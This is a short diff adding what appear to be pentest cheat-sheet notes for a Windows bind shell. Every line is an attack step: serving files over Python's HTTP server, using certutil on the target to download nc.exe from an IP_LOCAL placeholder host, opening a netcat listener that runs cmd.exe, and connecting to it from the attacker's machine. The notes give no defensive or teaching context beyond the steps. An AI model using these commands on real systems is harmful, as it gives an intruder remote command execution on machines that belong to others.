@@ -1,0 +1,10 @@
+BIND SHELL:
+Create a simple http server with python: 
+  python -m SimpleHTTPServer 80
+If connection to the target machine, download nc.exe(in this case is windows):
+  certutil -urlcache -f http://IP_LOCAL/nc.exe nc.exe
+Set a listener with port 1234 in target machine:
+  nc.exe -nvlp 1234 -e cmd.exe
+On local machine we request connection to this listener:
+  nc -nv IP_TARGET 1234
+A command shell will open
